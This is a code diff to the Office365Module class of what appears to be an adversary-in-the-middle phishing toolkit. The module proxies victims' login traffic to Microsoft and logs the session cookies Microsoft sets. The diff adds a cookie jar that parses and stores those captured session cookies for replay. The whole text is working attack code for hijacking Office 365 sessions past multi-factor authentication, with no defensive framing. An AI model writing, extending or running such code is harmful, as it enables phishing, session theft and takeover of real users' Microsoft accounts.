@@ -49,6 +49,8 @@ class Office365Module(BaseModule):
         self.aitm_manager = AiTMManager()
         self.aitm_proxy_url = None
         self.attack_mode = "aitm"  # "aitm" or "selenium"
+        # Store original Microsoft cookies to replay back to Microsoft on subsequent requests
+        self.ms_cookie_jar: dict[str, str] = {}
 
 
     def log(self, message):
@@ -907,7 +909,7 @@ class Office365Module(BaseModule):
             headers['Host'] = target_host_hdr
             # ------------------------------------------------------------
 
-            # Make the request to Microsoft
+            # Make the request to Microsoft (after injecting cookies)
             if flask_request.method == 'POST':
                 resp = requests.post(target_url, headers=headers, data=flask_request.get_data(), 
                                    allow_redirects=False, timeout=30)
@@ -925,6 +927,12 @@ class Office365Module(BaseModule):
                             'raw_header': cookie_header,
                             'parsed': self._parse_cookie_header(cookie_header)
                         })
+                        # Store original cookie for replay
+                        try:
+                            name, val = cookie_header.split(';',1)[0].split('=',1)
+                            self.ms_cookie_jar[name.strip()] = val.strip()
+                        except Exception:
+                            pass
                         self.log(f"[AiTM] Captured cookie: {cookie_header[:50]}...")
             
             # If we captured cookies, this might be the authentication success!
